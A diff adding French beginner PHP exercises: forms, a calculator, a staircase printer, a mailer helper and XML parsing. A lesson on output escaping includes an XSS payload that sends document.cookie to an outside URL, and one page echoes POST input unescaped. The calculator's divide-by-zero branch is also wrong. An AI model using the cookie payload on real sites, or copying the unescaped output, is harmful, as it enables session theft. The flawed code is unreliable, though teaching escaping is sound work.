@@ -1,0 +1,495 @@
+<form action="result_vehicule.php" method="POST">
+    <div>
+        <label for="marque">Marque :</label>
+        <input type="text" id="marque" name="marque">
+    </div>
+    <div>
+        <label for="modele">Modele :</label>
+        <input type="text" id="modele" name="modele">
+    </div>
+    <div>
+        <label for="puissance">Puissance :</label>
+        <input type="number" id="puissance" name="puissance">
+    </div>
+    <div>
+        <label for="permis">Permis :</label>
+        <select name="permis">
+            <option value="a">A - moto</option>
+            <option value="b">B - voiture</option>
+            <option value="c">C - camion</option>
+            <option value="d">D - bus</option>
+        </select>
+    </div>
+    <input type="submit" value="Submit" />
+</form>
+
+
+
+<?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+echo "Marque : ".$_POST['marque'];
+echo "<br/>";
+
+echo "Modele : ".getModele($_POST['modele']);
+echo "<br/>";
+
+echo "Puissance : ".getPuissance($_POST['permis'], $_POST['puissance']);
+echo "<br/>";
+
+echo "Permis : ".getPermisEmoji($_POST['permis']);
+echo "<br/>";
+
+function getModele($modele){
+    if($modele == "formule 1" OR $modele == "F1"){
+        $modele = "🏎️";
+    }
+    return $modele;
+}
+
+function getPuissance($permis, $puissance){
+    if($permis == "b" && $puissance <= 1){
+        $puissance = "🐌";
+    }
+    else{
+        $puissance = $puissance . " ch";
+    }
+    return $puissance;
+}
+
+function getPermisEmoji($permis){
+    $emoji = null;
+
+    switch ($permis){
+        case "a":
+            $emoji =  "🏍️";
+            break;
+        case "b":
+            $emoji =  "🚗";
+            break;
+        case "c":
+            $emoji =  "🚚";
+            break;
+        case "d":
+            $emoji = "🚌";
+            break;
+    }
+
+    return $emoji;
+}
+
+
+
+
+
+<form action="resultat_formulaire_get.php" method="GET">
+    <div>
+        <label for="prenom">Prenom :</label>
+        <input type="text" id="prenom" name="prenom">
+    </div>
+    <div>
+        <label for="age">Age :</label>
+        <input type="number" id="age" name="age"></input>
+    </div>
+    <input type="submit" value="Submit" />
+</form>
+
+<?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+
+
+if(isset($_GET["prenom"]) && isset($_GET["age"])){
+    $prenom = $_GET["prenom"];
+    $age = $_GET["age"];
+
+    // echo $prenom." ". $age;
+    echo cleanGETandPOST($prenom);
+    // echo htmlspecialchars($prenom);
+    
+    echo " <br/>";
+    // echo htmlspecialchars(utf8_encode($prenom))." ". $age;
+
+    if(is_numeric($age)){
+        echo htmlspecialchars($age);
+    }
+    else{
+        echo "Merci de saisir un entier pour l'age";
+    }
+    // echo is_numeric($age);
+    // echo "<br>";
+    // echo filter_var($age, FILTER_VALIDATE_INT);
+
+}
+
+function cleanGETandPOST($string){
+    return htmlspecialchars(trim(utf8_encode($string)));
+}
+
+<script>alert("hello")</script>
+
+<script> window.open('https://google.com?a='+document.cookie) </script>
+
+
+<img src="https://www.iconshock.com/img/categories/optimized/gradientify.webp"/>
+
+
+
+
+
+
+<form action="result_calculatrice.php" method="GET">
+    <div>
+        <label for="nombre1">Nombre 1 :</label>
+        <input type="text" id="nombre1" name="nombre1">
+    </div>
+    <div>
+        <label for="nombre2">Nombre 2 :</label>
+        <input type="text" id="nombre2" name="nombre2">
+    </div>
+    <div>
+        Operation<br/>
+        <input type="radio" id="addition" name="operation" value="addition">
+        <label for="addition">+ Addition</label><br>
+        <input type="radio" id="soustraction" name="operation" value="soustraction">
+        <label for="soustraction">- Soustraction</label><br>
+        <input type="radio" id="multiplication" name="operation" value="multiplication">
+        <label for="multiplication">* Multiplication</label><br>
+        <input type="radio" id="division" name="operation" value="division">
+        <label for="division">/ Division</label> 
+    </div>
+    <input type="submit" value="Submit" />
+</form>
+
+
+
+<?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+// vérifier si on récupère les bonnes variables
+// echo $operation = $_GET["operation"];
+// echo "<br>";echo $nombre1 = $_GET["nombre1"];
+// echo "<br>";
+// echo $nombre2 = $_GET["nombre2"];
+
+// on créer des variables pour faciliter la manipulation
+$operation = $_GET["operation"];
+$nombre1 = $_GET["nombre1"];
+$nombre2 = $_GET["nombre2"];
+
+// On sélection l'opération
+switch ($operation){
+    case "addition":
+        // selon le type d'opération on réalise le calcul associé
+        $resultat = $nombre1 + $nombre2;
+        break;
+    case "soustraction":
+        $resultat = $nombre1 - $nombre2;
+        break;
+    case "multiplication":
+        $resultat = $nombre1 * $nombre2;
+        break;
+    case "division":
+        // le (int) cast = il force la conversion de la variable $nombre2 en integer
+        if((int)$nombre2 != "0"){
+            $resultat = $nombre1 / $nombre2;
+        }
+        else{
+            $resultat = $nombre2 / $nombre1;
+        }
+        break;
+}
+
+echo "Résultat : ".$resultat;
+
+
+
+
+<?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+// vérifier si on récupère les bonnes variables
+// echo $operation = $_GET["operation"];
+// echo "<br>";echo $nombre1 = $_GET["nombre1"];
+// echo "<br>";
+// echo $nombre2 = $_GET["nombre2"];
+
+// vérifier si les variables GET existent / ont des valeurs
+if(isset($_GET["operation"]) && isset($_GET["nombre1"]) && isset($_GET["nombre2"])){
+    // on créer des variables pour faciliter la manipulation
+    $operation = $_GET["operation"];
+    $nombre1 = $_GET["nombre1"];
+    $nombre2 = $_GET["nombre2"];
+    // && = AND
+    if(is_numeric($nombre1) && is_numeric($nombre1)){
+        // On sélection l'opération
+        switch ($operation){
+            case "addition":
+                // selon le type d'opération on réalise le calcul associé
+                $resultat = $nombre1 + $nombre2;
+                break;
+            case "soustraction":
+                $resultat = $nombre1 - $nombre2;
+                break;
+            case "multiplication":
+                $resultat = $nombre1 * $nombre2;
+                break;
+            case "division":
+                // le (int) cast = il force la conversion de la variable $nombre2 en integer
+                if((int)$nombre2 != "0"){
+                    $resultat = $nombre1 / $nombre2;
+                }
+                else{
+                    $resultat = $nombre2 / $nombre1;
+                }
+                break;
+        }
+        echo "Résultat : ".$resultat;
+    }
+    else{
+        echo "Merci de saisir des entiers ou décimales";
+    }
+}
+else{
+    echo "Merci d'accéder au formulaire";
+}
+
+
+// 7. Créer une fonction qui génère un numéro de téléphone aléatoire au format 06 12 25 35 42
+echo generateFRNumber();
+
+function generateFRNumber(){
+    $number = null;
+
+    // on génère 0 + un nombre aléatoire entre 1 et 9 + un espace
+    $number = "0".rand(1, 9)." ";
+    
+    // on répète 4 fois qui correspond à la suite du numéro "12 25 35 42"
+    for($i=0;$i<4;$i++){
+        // on ajouter à la variable $number précédente, on lui ajoute deux chiffres aléatoires entre 0 ou 9 + un espace
+        $number = $number . rand(0, 9) . rand(0, 9) . " ";
+    }
+
+    return $number;
+}
+
+// esc
+
+<form action="result_escalier.php" method="GET">
+    <div>
+        <label for="nb_marches">Nombre de marches :</label>
+        <input type="text" id="nb_marches" name="nb_marches">
+    </div>
+    <input type="submit" value="Submit" />
+</form>
+
+
+
+<?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+// escalier 1 marche
+// echo "*";
+// echo "<br/>";
+// // escalier 2 marches
+// echo "**";
+// // escalier 3 marches
+// echo "<br/>";
+// echo "***";
+
+echo createEscalier($_GET["nb_marches"]);
+
+
+function createEscalier($nbmarches){
+    $escalier = "";
+
+    // cette boucle crée les niveaux (marches/"étages")
+    for($i=1; $i<$nbmarches+1; $i++){
+        // cette boucle gère la taille de la marche = ajoute une étoile
+        for($y=1; $y<$i+1; $y++){
+            $escalier = $escalier . "*";
+        }
+        $escalier = $escalier . "<br/>";
+    }
+
+    return $escalier;
+}
+
+function envoyerEmail($destinataire, $sujet, $message){
+    //Create an instance; passing `true` enables exceptions
+    $mail = new PHPMailer(true);
+
+    try {
+        //Server settings
+        $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
+        $mail->isSMTP();                                            //Send using SMTP
+        $mail->Host       = 'XXX';                     //Set the SMTP server to send through
+        $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
+        $mail->Username   = 'XXX';                     //SMTP username
+        $mail->Password   = 'XXXX';                               //SMTP password
+        $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
+        $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
+
+        //Recipients
+        $mail->setFrom('XXXX');
+        $mail->addAddress($destinataire);
+
+        //Content
+        $mail->isHTML(true);                                  //Set email format to HTML
+        $mail->Subject = $sujet;
+        $mail->Body    = $message;
+
+        $mail->send();
+        echo 'Message has been sent';
+    } catch (Exception $e) {
+        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
+    }
+}
+
+
+<?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+// ex 1 Reprendre l’exemple des élèves « eleves.xml » et les afficher avec PHP
+// $xml = simplexml_load_file("eleves.xml");
+// print_r($xml);
+
+
+// ex2 Afficher 1 élève par ligne
+$xml = simplexml_load_file("eleves.xml");
+
+// foreach($xml->children() as $child){
+// 	print_r($child);
+//     echo "<br/>";
+// }
+
+
+// ex3 Afficher les résultats sous la forme suivante :
+    // nom : Haviva prenom : Bennett age : 25 moyenne : 13 
+    // nom : Heidi prenom : Slater age : 25 moyenne : 4 
+    // nom : Alfonso prenom : Ellis age : 22 moyenne : 13
+// foreach($xml->children() as $child){
+// 	// un élève, et on parcourt tous les éléments d'un élève
+//     foreach($child as $key => $value){
+//         echo "<u>".$key."</u> : ".$value ." ";
+//     }
+//     echo "<br/>";
+// }
+
+// ex4 Calculer la moyenne des notes de la classe
+// $somme = 0;
+// $i = 0;
+// foreach($xml->children() as $child){
+//     // un élève, et on parcourt tous les éléments d'un élève
+//     $somme = $somme + $child->moyenne;
+//     $i++;
+// }
+// // echo "Somme : ".$somme;echo "<br/>";
+// // echo "i : ".$i;echo "<br/>";
+// echo "Moyenne : ". ($somme/$i);
+
+// ex5 Calculer l'âge moyen des élèves
+$somme = 0;
+$i = 0;
+foreach($xml->children() as $child){
+    // un élève, et on parcourt tous les éléments d'un élève
+    $somme = $somme + $child->age;
+    $i++;
+}
+// echo "Somme : ".$somme;echo "<br/>";
+// echo "i : ".$i;echo "<br/>";
+echo "Age moyen : ". ($somme/$i);
+
+
+
+
+
+
+// plus petit et plus grand
+
+function retournerLePlusPetit($ages){
+    $plusPetit = $ages[0];
+    foreach($ages as $age){
+        if($plusPetit > $age){
+            $plusPetit = $age;
+        }
+    }
+    return $plusPetit;
+}
+
+
+function retournerLePlusGrand($ages){
+    $plusGrand = $ages[0];
+    foreach($ages as $age){
+        if($plusGrand < $age){
+            $plusGrand = $age;
+        }
+    }
+    return $plusGrand;
+}
+
+
+// identifier_xml_ex3.xml
+
+
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+
+$xml = simplexml_load_file("identifier_xml_ex3.xml");
+
+// $listeDesPrix = array();
+
+$prixMin = floatval(str_replace("$", "",$xml -> children() -> children() -> PRICE));
+
+echo "prix min 1°: ".$prixMin."<br/>";
+
+foreach($xml -> children() as $child) {
+    // $child->PRICE;
+    foreach ($child as $key => $value){
+        if ($key ==  "PRICE" ){
+    // print_r($child);
+    // echo  "<br>";
+    // $child->PRICE;
+    // echo  "<br>";
+    echo floatval(str_replace("$", "",$value)) . "<br>";
+// array_push($listeDesPrix, (float)floatval(str_replace("$", "",$value)));
+if($prixMin > floatval(str_replace("$", "",$value))) {
+    echo "A";
+    $prixMin = floatval(str_replace("$", "",$value));
+    echo $prixMin;
+    echo "<br/>";
+}
+}
+}
+}
+
+echo "prix min ".$prixMin;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
